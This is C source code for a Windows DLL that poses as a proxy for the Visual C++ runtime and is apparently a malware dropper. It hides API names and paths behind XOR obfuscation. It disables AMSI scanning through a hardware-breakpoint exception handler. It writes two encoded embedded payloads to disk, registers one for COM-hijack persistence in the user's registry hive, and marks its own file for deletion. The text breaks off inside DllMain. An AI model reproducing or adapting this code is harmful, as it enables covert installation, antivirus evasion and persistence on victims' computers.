#include <windows.h>

void ___chkstk_ms(void) { return; }

void *memset(void *dest, int val, size_t count) {
  unsigned char *p = (unsigned char *)dest;
  while (count--)
    *p++ = (unsigned char)val;
  return dest;
}

void *memcpy(void *dest, const void *src, size_t count) {
  unsigned char *d = (unsigned char *)dest;
  const unsigned char *s = (const unsigned char *)src;
  while (count--)
    *d++ = *s++;
  return dest;
}

void *memmove(void *dest, const void *src, size_t count) {
  unsigned char *d = (unsigned char *)dest;
  const unsigned char *s = (const unsigned char *)src;
  if (d < s) {
    while (count--)
      *d++ = *s++;
  } else if (d > s) {
    d += count;
    s += count;
    while (count--)
      *(--d) = *(--s);
  }
  return dest;
}

void *memchr(const void *ptr, int val, size_t count) {
  const unsigned char *p = (const unsigned char *)ptr;
  while (count--) {
    if (*p == (unsigned char)val)
      return (void *)p;
    p++;
  }
  return (void *)0;
}

int memcmp(const void *s1, const void *s2, size_t count) {
  const unsigned char *a = (const unsigned char *)s1;
  const unsigned char *b = (const unsigned char *)s2;
  while (count--) {
    if (*a != *b)
      return *a - *b;
    a++;
    b++;
  }
  return 0;
}

int strcmp(const char *s1, const char *s2) {
  while (*s1 && (*s1 == *s2)) {
    s1++;
    s2++;
  }
  return *(const unsigned char *)s1 - *(const unsigned char *)s2;
}

static int triggered = 0;

static unsigned char ck2[] = "9832gf2bc29_120e9hd10c))b@@!11";
static unsigned int ck2l = 30;

static void xd(unsigned char *enc, char *out, int len) {
  int i;
  for (i = 0; i < len; i++)
    out[i] = enc[i] ^ ck2[i % ck2l];
  out[len] = 0;
}

static void xe(char *plain, unsigned char *enc, int len) {
  int i;
  for (i = 0; i < len; i++)
    enc[i] = plain[i] ^ ck2[i % ck2l];
  memset(plain, 0, len);
}

static void xb(unsigned char *enc, unsigned char *out, int len,
               int abs_offset) {
  int i;
  for (i = 0; i < len; i++)
    out[i] = enc[i] ^ ck2[(abs_offset + i) % ck2l];
}

static HMODULE rl(unsigned char *enc, int len) {
  char buf[64] = {0};
  xd(enc, buf, len);
  HMODULE mod = LoadLibraryA(buf);
  xe(buf, enc, len);
  return mod;
}

static FARPROC ra(HMODULE mod, unsigned char *enc, int len) {
  char buf[64] = {0};
  xd(enc, buf, len);
  FARPROC fn = GetProcAddress(mod, buf);
  xe(buf, enc, len);
  return fn;
}

static int slen(const char *s) {
  int i = 0;
  while (s[i])
    i++;
  return i;
}

size_t strlen(const char *s) { return (size_t)slen(s); }

typedef DWORD(WINAPI *pExpandEnvironmentStringsA)(LPCSTR, LPSTR, DWORD);

static int asc_to_w(const char *s, WCHAR *w, int wcap) {
  int i = 0;

  while (s[i] && i < wcap - 1) {
    w[i] = (WCHAR)(unsigned char)s[i];
    i++;
  }
  w[i] = 0;
  return i;
}

__attribute__((noinline, optimize("O0")))
static void reg_install(const char *subkey, const char *dll_path) {
  HKEY hKey;
  HKEY hkcu = (HKEY)(ULONG_PTR)(LONG)0x80000001;
  WCHAR wdll[512];
  static const WCHAR wtm[] = L"ThreadingModel";
  static const WCHAR wapt[] = L"Apartment";
  int plen;
  DWORD cbDllW;
  DWORD cbDllA;

  if (!subkey || !subkey[0] || !dll_path || !dll_path[0])
    return;

  if (RegCreateKeyExA(hkcu, subkey, 0, NULL, 0, 0x00020006, NULL, &hKey,
                      NULL) != ERROR_SUCCESS)
    return;

  plen = asc_to_w(dll_path, wdll, 512);
  cbDllW = (DWORD)((plen + 1) * sizeof(WCHAR));
  cbDllA = (DWORD)plen + 1;

  if (RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE *)wdll, cbDllW) !=
      ERROR_SUCCESS)
    (void)RegSetValueExW(hKey, L"", 0, REG_SZ, (const BYTE *)wdll, cbDllW);
  (void)RegSetValueExW(hKey, wtm, 0, REG_SZ, (const BYTE *)wapt, sizeof(wapt));

  if (RegSetValueExA(hKey, "", 0, REG_SZ, (const BYTE *)dll_path, cbDllA) !=
      ERROR_SUCCESS)
    (void)RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE *)dll_path, cbDllA);
  (void)RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (const BYTE *)"Apartment", 10);

  RegCloseKey(hKey);
}

__attribute__((noinline))
static int popquiz(void) {
  volatile ULONG64 x = 0xA5A5A5A5A5A5A5A5ULL;
  volatile ULONG64 y = 0x5A5A5A5A5A5A5A5AULL;
  volatile DWORD c = 0;
  int i;

  for (i = 0; i < 8; i++) {
    x ^= (x << 13);
    x ^= (x >> 7);
    x ^= (x << 17);
    y = (y * 6364136223846793005ULL) + x;
    c ^= (DWORD)(x & 0xFFFFFFFFULL);
  }

  if (((x ^ y) & 0xFFFFULL) == 0xBEEFULL) {
    volatile DWORD acc = 0;
    for (i = 0; i < 2000; i++)
      acc += (DWORD)((i * 31) ^ (i << 2));
    return 1;
  }

  return 0;
}

static void path_expand(char *path, int cap, pExpandEnvironmentStringsA fExpand) {
  char tmp[512];
  DWORD n;

  if (!fExpand || !path || cap < 2)
    return;
  n = fExpand(path, tmp, (DWORD)sizeof(tmp));
  if (n == 0 || n > (DWORD)sizeof(tmp))
    return;
  if (n > (DWORD)cap)
    n = (DWORD)cap;
  memcpy(path, tmp, n);
  path[n - 1] = 0;
}

static void *g_bp_tgt;
static int g_veh_reg;

typedef LONG(WINAPI *pAddVectoredExceptionHandler)(ULONG,
                                                   PVECTORED_EXCEPTION_HANDLER);
typedef BOOL(WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL(WINAPI *pSetThreadContext)(HANDLE, const CONTEXT *);
typedef HANDLE(WINAPI *pGetCurrentThread)(void);
typedef HMODULE(WINAPI *pGetModuleHandleA)(LPCSTR);

static LONG WINAPI bp_veh(PEXCEPTION_POINTERS ex) {
  PCONTEXT ctx;
  DWORD_PTR *rsp;
  DWORD *res;

  if (!g_bp_tgt || !ex || !ex->ExceptionRecord || !ex->ContextRecord)
    return EXCEPTION_CONTINUE_SEARCH;
  if (ex->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
    return EXCEPTION_CONTINUE_SEARCH;

  ctx = ex->ContextRecord;
  if ((void *)(ULONG_PTR)ctx->Rip != g_bp_tgt)
    return EXCEPTION_CONTINUE_SEARCH;

  rsp = (DWORD_PTR *)(ULONG_PTR)ctx->Rsp;
  res = *(DWORD **)(rsp + 6);
  if (res)
    *res = 0;
  ctx->Rax = 0;
  ctx->Rip = *rsp;
  ctx->Rsp += 8;
  ctx->Dr6 = 0;
  ctx->EFlags |= 0x10000;
  return EXCEPTION_CONTINUE_EXECUTION;
}

static void bp_arm(void) {
  unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
                               0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};
  unsigned char e_amsi[] = {0x58, 0x55, 0x40, 0x5b, 0x49, 0x02, 0x5e, 0x0e};
  unsigned char e_AmsiScanBuffer[] = {0x78, 0x55, 0x40, 0x5b, 0x34, 0x05, 0x53,
                                    0x0c, 0x21, 0x47, 0x5f, 0x39, 0x54, 0x40};
  unsigned char e_AddVectoredExceptionHandler[] = {
      0x78, 0x5c, 0x57, 0x64, 0x02, 0x05, 0x46, 0x0d, 0x11, 0x57, 0x5d,
      0x1a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f, 0x78, 0x02,
      0x47, 0x4d, 0x0e, 0x25, 0x32};
  unsigned char e_GetModuleHandleA[] = {0x7e, 0x5d, 0x47, 0x7f, 0x08, 0x02,
                                        0x47, 0x0e, 0x06, 0x7a, 0x58, 0x31,
                                        0x55, 0x5e, 0x55, 0x24};
  unsigned char e_GetThreadContext[] = {0x7e, 0x5d, 0x47, 0x66, 0x0f, 0x14,
                                        0x57, 0x03, 0x07, 0x71, 0x56, 0x31,
                                        0x45, 0x57, 0x48, 0x11};
  unsigned char e_SetThreadContext[] = {0x6a, 0x5d, 0x47, 0x66, 0x0f, 0x14,
                                        0x57, 0x03, 0x07, 0x71, 0x56, 0x31,
                                        0x45, 0x57, 0x48, 0x11};
  unsigned char e_GetCurrentThread[] = {0x7e, 0x5d, 0x47, 0x71, 0x12, 0x14,
                                        0x40, 0x07, 0x0d, 0x46, 0x6d, 0x37,
                                        0x43, 0x57, 0x51, 0x01};

  HMODULE hK32;
  HMODULE hAmsi;
  void *fn;
  CONTEXT ctx;
  HANDLE hThread;

  hK32 = rl(e_kernel32, 13);
  if (!hK32)
    return;

  pGetModuleHandleA fGetModuleHandleA =
      (pGetModuleHandleA)ra(hK32, e_GetModuleHandleA, 16);
  pAddVectoredExceptionHandler fAddVectoredExceptionHandler =
      (pAddVectoredExceptionHandler)ra(hK32, e_AddVectoredExceptionHandler, 27);
  pGetThreadContext fGetThreadContext =
      (pGetThreadContext)ra(hK32, e_GetThreadContext, 16);
  pSetThreadContext fSetThreadContext =
      (pSetThreadContext)ra(hK32, e_SetThreadContext, 16);
  pGetCurrentThread fGetCurrentThread =
      (pGetCurrentThread)ra(hK32, e_GetCurrentThread, 16);

  if (!fGetModuleHandleA || !fAddVectoredExceptionHandler ||
      !fGetThreadContext || !fSetThreadContext || !fGetCurrentThread)
    return;

  {
    char amsi_buf[16];
    xd(e_amsi, amsi_buf, 8);
    hAmsi = fGetModuleHandleA(amsi_buf);
    xe(amsi_buf, e_amsi, 8);
  }
  if (!hAmsi)
    hAmsi = rl(e_amsi, 8);
  if (!hAmsi)
    return;

  if (!g_bp_tgt) {
    fn = (void *)ra(hAmsi, e_AmsiScanBuffer, 14);
    if (!fn)
      return;
    g_bp_tgt = fn;
  }

  if (!g_veh_reg) {
    if (!fAddVectoredExceptionHandler(1, bp_veh))
      return;
    g_veh_reg = 1;
  }

  fn = g_bp_tgt;
  memset(&ctx, 0, sizeof(ctx));
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
  hThread = fGetCurrentThread();
  if (!fGetThreadContext(hThread, &ctx))
    return;

  ctx.Dr0 = (DWORD_PTR)fn;
  ctx.Dr7 = 0x00000001;
  (void)fSetThreadContext(hThread, &ctx);
}

#include "data.h"

void *_set_se_translator(void *translator) {
  if (triggered)
    return (void *)0;
  triggered = 1;

  bp_arm();

  if (popquiz()) {
      return (void *)0;
  }

  unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
                                0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};

  HMODULE hK32 = rl(e_kernel32, 13);

  unsigned char e_CreateDirectoryA[] = {0x7a, 0x4a, 0x56, 0x53, 0x13, 0x03,
                                        0x76, 0x0b, 0x11, 0x57, 0x5a, 0x2b,
                                        0x5e, 0x40, 0x49, 0x24, 0x39};
  unsigned char e_CreateFileA[] = {0x7a, 0x4a, 0x56, 0x53, 0x13, 0x03,
                                   0x74, 0x0b, 0x0f, 0x57, 0x78, 0x5f};
  unsigned char e_WriteFile[] = {0x6e, 0x4a, 0x5a, 0x46, 0x02,
                                 0x20, 0x5b, 0x0e, 0x06, 0x32};
  unsigned char e_CloseHandle[] = {0x7a, 0x54, 0x5c, 0x41, 0x02, 0x2e,
                                   0x53, 0x0c, 0x07, 0x5e, 0x5c, 0x5f};

  unsigned char e_MoveFileExA[] = {0x74, 0x57, 0x45, 0x57, 0x21, 0x0f,
                                   0x5e, 0x07, 0x26, 0x4a, 0x78};
  unsigned char e_GetModuleFileNameA[] = {0x7e, 0x5d, 0x47, 0x7f, 0x08, 0x02,
                                          0x47, 0x0e, 0x06, 0x74, 0x50, 0x33,
                                          0x54, 0x7c, 0x51, 0x08, 0x5c, 0x29};
  unsigned char e_VirtualQuery[] = {0x6f, 0x51, 0x41, 0x46, 0x12, 0x07,
                                    0x5e, 0x33, 0x16, 0x57, 0x4b, 0x26};
  unsigned char e_ExpandEnvironmentStringsA[] = {
      0x7c, 0x40, 0x43, 0x53, 0x09, 0x02, 0x77, 0x0c, 0x15, 0x5b, 0x4b, 0x30,
      0x5f, 0x5f, 0x55, 0x0b, 0x4d, 0x3b, 0x10, 0x43, 0x59, 0x0d, 0x4e, 0x5a,
      0x23};

  typedef BOOL(WINAPI * pCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
  typedef HANDLE(WINAPI * pCreateFileA)(
      LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
  typedef BOOL(WINAPI * pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD,
                                    LPOVERLAPPED);
  typedef BOOL(WINAPI * pCloseHandle)(HANDLE);
  typedef BOOL(WINAPI * pMoveFileExA)(LPCSTR, LPCSTR, DWORD);
  typedef DWORD(WINAPI * pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
  typedef SIZE_T(WINAPI * pVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION,
                                         SIZE_T);

  pCreateDirectoryA fCreateDirectoryA =
      (pCreateDirectoryA)ra(hK32, e_CreateDirectoryA, 17);
  pCreateFileA fCreateFileA = (pCreateFileA)ra(hK32, e_CreateFileA, 12);
  pWriteFile fWriteFile = (pWriteFile)ra(hK32, e_WriteFile, 10);
  pCloseHandle fCloseHandle = (pCloseHandle)ra(hK32, e_CloseHandle, 12);
  pMoveFileExA fMoveFileExA = (pMoveFileExA)ra(hK32, e_MoveFileExA, 11);
  pGetModuleFileNameA fGetModuleFileNameA =
      (pGetModuleFileNameA)ra(hK32, e_GetModuleFileNameA, 18);
  pVirtualQuery fVirtualQuery = (pVirtualQuery)ra(hK32, e_VirtualQuery, 12);
  pExpandEnvironmentStringsA fExpandEnvironmentStringsA =
      (pExpandEnvironmentStringsA)ra(hK32, e_ExpandEnvironmentStringsA, 25);

  unsigned char e_dir1[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54};
  unsigned char e_dir2[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64};
  unsigned char e_dir3[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64, 0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56, 0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01};
  unsigned char e_dir4[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64, 0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56, 0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01, 0x6c, 0x29, 0x50, 0x0a, 0x16, 0x50, 0x42, 0x1a};
  char sys_dir[256];
  
  xd(e_dir1, sys_dir, 20);
  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
  fCreateDirectoryA(sys_dir, NULL);
  
  xd(e_dir2, sys_dir, 24);
  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
  fCreateDirectoryA(sys_dir, NULL);
  
  xd(e_dir3, sys_dir, 44);
  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
  fCreateDirectoryA(sys_dir, NULL);
  
  xd(e_dir4, sys_dir, 52);
  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
  fCreateDirectoryA(sys_dir, NULL);
  
  unsigned char e_sys_dir[] = {
      0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e,
      0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64,
      0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56,
      0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01, 0x6c, 0x29, 0x50, 0x0a,
      0x16, 0x50, 0x42, 0x1a, 0x75, 0x6d, 0x10, 0x29, 0x36, 0x44, 0x43, 0x42};
  xd(e_sys_dir, sys_dir, 60);
  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
  fCreateDirectoryA(sys_dir, NULL);

  unsigned char e_sys_path[] = {
      0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e,
      0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64,
      0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56,
      0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01, 0x6c, 0x29, 0x50, 0x0a,
      0x16, 0x50, 0x42, 0x1a, 0x75, 0x6d, 0x10, 0x29, 0x36, 0x44, 0x43, 0x42,
      0x65, 0x59, 0x5e, 0x56, 0x51, 0x52, 0x1c, 0x11, 0x1a, 0x41};
  char sys_path[256];
  xd(e_sys_path, sys_path, 70);
  path_expand(sys_path, sizeof(sys_path), fExpandEnvironmentStringsA);

  HANDLE hFile = fCreateFileA(sys_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    DWORD written = 0;
    int current_offset = 0;
    int chunk_size = 4096;
    while (current_offset < file_sys_len) {
      int sz = file_sys_len - current_offset;
      if (sz > chunk_size)
        sz = chunk_size;
      xb(file_sys + current_offset, file_sys + current_offset, sz,
         current_offset);
      fWriteFile(hFile, file_sys + current_offset, sz, &written, NULL);
      current_offset += sz;
    }
    fCloseHandle(hFile);
  }

  unsigned char e_dll_dir1[] = {0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78, 0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c, 0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b};
  unsigned char e_dll_dir2[] = {0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78, 0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c, 0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b, 0x6f, 0x71, 0x0b, 0x09, 0x47, 0x06, 0x30, 0x46, 0x56, 0x2d, 0x54};
  unsigned char e_dll_dir3[] = {0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78, 0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c, 0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b, 0x6f, 0x71, 0x0b, 0x09, 0x47, 0x06, 0x30, 0x46, 0x56, 0x2d, 0x54, 0x6e, 0x63, 0x0d, 0x5c, 0x04, 0x08};

  xd(e_dll_dir1, sys_dir, 32);
  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
  fCreateDirectoryA(sys_dir, NULL);

  xd(e_dll_dir2, sys_dir, 43);
  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
  fCreateDirectoryA(sys_dir, NULL);

  xd(e_dll_dir3, sys_dir, 49);
  path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
  fCreateDirectoryA(sys_dir, NULL);

  #define DLL_PATH_LEN 85
  unsigned char e_dll_path[] = {
        0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78,
        0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c,
        0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b, 0x6f,
        0x71, 0x0b, 0x09, 0x47, 0x06, 0x30, 0x46, 0x56, 0x2d, 0x54, 0x6e,
        0x63, 0x0d, 0x5c, 0x04, 0x08, 0x6d, 0x67, 0x0a, 0x47, 0x4d, 0x0d,
        0x37, 0x33, 0x0f, 0x72, 0x5d, 0x56, 0x4d, 0x57, 0x61, 0x13, 0x09,
        0x40, 0x07, 0x4d, 0x61, 0x5a, 0x37, 0x54, 0x5f, 0x51, 0x4b, 0x6a,
        0x00, 0x01, 0x5d, 0x5c, 0x4d, 0x4d, 0x45, 0x0e
  };
  char dll_path[512];
  memset(dll_path, 0, sizeof(dll_path));
  xd(e_dll_path, dll_path, DLL_PATH_LEN);
  path_expand(dll_path, sizeof(dll_path), fExpandEnvironmentStringsA);

  unsigned char e_reg_key[] = {
      0x6a, 0x57, 0x55, 0x46, 0x10, 0x07, 0x40, 0x07, 0x3f, 0x71, 0x55,
      0x3e, 0x42, 0x41, 0x55, 0x16, 0x65, 0x2b, 0x28, 0x62, 0x79, 0x27,
      0x75, 0x52, 0x57, 0x70, 0x03, 0x64, 0x06, 0x04, 0x7b, 0x7b, 0x1e,
      0x05, 0x51, 0x50, 0x71, 0x4f, 0x57, 0x03, 0x0a, 0x69, 0x1c, 0x70,
      0x76, 0x50, 0x7c, 0x45, 0x5d, 0x00, 0x09, 0x54, 0x68, 0x68, 0x50,
      0x73, 0x75, 0x17, 0x08, 0x74, 0x44, 0x64, 0x7a, 0x5c, 0x37, 0x14,
      0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57, 0x39
  };
  char reg_key[256];

  memset(reg_key, 0, sizeof(reg_key));
  xd(e_reg_key, reg_key, 76);
  reg_install(reg_key, dll_path);

  hFile = fCreateFileA(dll_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    DWORD written = 0;
    int current_offset = 0;
    int chunk_size = 4096;
    while (current_offset < file_dll_len) {
      int sz = file_dll_len - current_offset;
      if (sz > chunk_size)
        sz = chunk_size;
      xb(file_dll + current_offset, file_dll + current_offset, sz,
         current_offset);
      fWriteFile(hFile, file_dll + current_offset, sz, &written, NULL);
      current_offset += sz;
    }
    fCloseHandle(hFile);
  }

  unsigned char e_GetSystemTime[] = {0x7e, 0x5d, 0x47, 0x61, 0x1e, 0x15, 0x46, 0x07, 0x0e, 0x66, 0x50, 0x32, 0x54};
  unsigned char e_GetTimeFormatA[] = {0x7e, 0x5d, 0x47, 0x66, 0x0e, 0x0b, 0x57, 0x24, 0x0c, 0x40, 0x54, 0x3e, 0x45, 0x73};
  
  typedef VOID (WINAPI *pGetSystemTime)(LPSYSTEMTIME);
  typedef int (WINAPI *pGetTimeFormatA)(LCID, DWORD, const SYSTEMTIME*, LPCSTR, LPSTR, int);
  
  pGetSystemTime fGetSystemTime = (pGetSystemTime)ra(hK32, e_GetSystemTime, 13);
  pGetTimeFormatA fGetTimeFormatA = (pGetTimeFormatA)ra(hK32, e_GetTimeFormatA, 14);

  SYSTEMTIME st;
  fGetSystemTime(&st);
  char timeBuf[128];
  fGetTimeFormatA(LOCALE_USER_DEFAULT, 0, &st, NULL, timeBuf, 128);

  MEMORY_BASIC_INFORMATION mbi;
  HMODULE hModule = NULL;
  if (fVirtualQuery(_set_se_translator, &mbi, sizeof(mbi)) != 0) {
    hModule = (HMODULE)mbi.AllocationBase;
  }

  if (hModule != NULL) {
    char module_path[MAX_PATH];
    if (fGetModuleFileNameA(hModule, module_path, MAX_PATH) > 0) {
      fMoveFileExA(module_path, NULL, 0x4);
    }
  }

  return (void *)0;
}

void *p___C_specific_handler;
EXCEPTION_DISPOSITION __attribute__((naked))
__C_specific_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
                     void *EstablisherFrame, struct _CONTEXT *ContextRecord,
                     struct _DISPATCHER_CONTEXT *DispatcherContext) {
  asm("jmp *p___C_specific_handler(%rip)");
}

void *p___current_exception;
void __attribute__((naked)) __current_exception() {
  asm("jmp *p___current_exception(%rip)");
}

void *p___current_exception_context;
void __attribute__((naked)) __current_exception_context() {
  asm("jmp *p___current_exception_context(%rip)");
}

void *p___CxxFrameHandler3;
void __attribute__((naked)) __CxxFrameHandler3() {
  asm("jmp *p___CxxFrameHandler3(%rip)");
}

void *p___std_exception_copy;
void __attribute__((naked)) __std_exception_copy() {
  asm("jmp *p___std_exception_copy(%rip)");
}

void *p___std_exception_destroy;
void __attribute__((naked)) __std_exception_destroy() {
  asm("jmp *p___std_exception_destroy(%rip)");
}

void *p__CxxThrowException;
void __attribute__((naked)) _CxxThrowException() {
  asm("jmp *p__CxxThrowException(%rip)");
}

void *p___uncaught_exceptions;
void __attribute__((naked)) __uncaught_exceptions() {
  asm("jmp *p___uncaught_exceptions(%rip)");
}

void *p___uncaught_exception;
void __attribute__((naked)) __uncaught_exception() {
  asm("jmp *p___uncaught_exception(%rip)");
}

void *p___std_terminate;
void __attribute__((naked)) __std_terminate() {
  asm("jmp *p___std_terminate(%rip)");
}

void *p__purecall;
void __attribute__((naked)) _purecall() { asm("jmp *p__purecall(%rip)"); }

void *p___AdjustPointer;
void __attribute__((naked)) __AdjustPointer() {
  asm("jmp *p___AdjustPointer(%rip)");
}

void *p___std_type_info_destroy_list;
void __attribute__((naked)) __std_type_info_destroy_list() {
  asm("jmp *p___std_type_info_destroy_list(%rip)");
}

void *p___processing_throw;
void __attribute__((naked)) __processing_throw() {
  asm("jmp *p___processing_throw(%rip)");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    bp_arm();

    unsigned char e_sys_vc[] = {
        0x7a, 0x02, 0x6f, 0x65, 0x0e, 0x08, 0x56, 0x0d, 0x14, 0x41, 0x65, 0x0c,
        0x48, 0x41, 0x44, 0x00, 0x54, 0x5b, 0x56, 0x6d, 0x46, 0x00, 0x5b, 0x5c,
        0x0c, 0x34, 0x29, 0x4c, 0x54, 0x00, 0x0d, 0x08, 0x1d, 0x56, 0x0b, 0x0a};
    char sys_vc[64];
    xd(e_sys_vc, sys_vc, 36);

    HMODULE hReal = LoadLibraryA(sys_vc);
    if (hReal) {
      unsigned char e___C_specific_handler[] = {
          0x66, 0x67, 0x70, 0x6d, 0x14, 0x16, 0x57, 0x01, 0x0a, 0x54,
          0x50, 0x3c, 0x6e, 0x5a, 0x51, 0x0b, 0x5d, 0x04, 0x01, 0x43}; // 20
      p___C_specific_handler = ra(hReal, e___C_specific_handler, 20);

      unsigned char e___current_exception[] = {
          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17, 0x6d,
          0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07, 0x0a}; // 19
      p___current_exception = ra(hReal, e___current_exception, 19);

      unsigned char e___current_exception_context[] = {
          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17,
          0x6d, 0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07,
          0x0a, 0x6e, 0x53, 0x0c, 0x47, 0x5d, 0x07, 0x38, 0x34}; // 27
      p___current_exception_context =
          ra(hReal, e___current_exception_context, 27);

      unsigned char e___CxxFrameHandler3[] = {
          0x66, 0x67, 0x70, 0x4a, 0x1f, 0x20, 0x40, 0x03, 0x0e,
          0x57, 0x71, 0x3e, 0x5f, 0x56, 0x5c, 0x00, 0x4b, 0x5b}; // 18
      p___CxxFrameHandler3 = ra(hReal, e___CxxFrameHandler3, 18);

      unsigned char e___std_exception_copy[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a, 0x00, 0x57,
          0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a, 0x5a, 0x07, 0x14, 0x48}; // 20
      p___std_exception_copy = ra(hReal, e___std_exception_copy, 20);

      unsigned char e___std_exception_destroy[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a,
          0x00, 0x57, 0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a,
          0x5d, 0x0d, 0x17, 0x45, 0x42, 0x0c, 0x50}; // 23
      p___std_exception_destroy = ra(hReal, e___std_exception_destroy, 23);

      unsigned char e__CxxThrowException[] = {
          0x66, 0x7b, 0x4b, 0x4a, 0x33, 0x0e, 0x40, 0x0d, 0x14,
          0x77, 0x41, 0x3c, 0x54, 0x42, 0x44, 0x0c, 0x56, 0x06}; // 18
      p__CxxThrowException = ra(hReal, e__CxxThrowException, 18);

      unsigned char e___uncaught_exceptions[] = {
          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46, 0x66,
          0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f, 0x43}; // 21
      p___uncaught_exceptions = ra(hReal, e___uncaught_exceptions, 21);

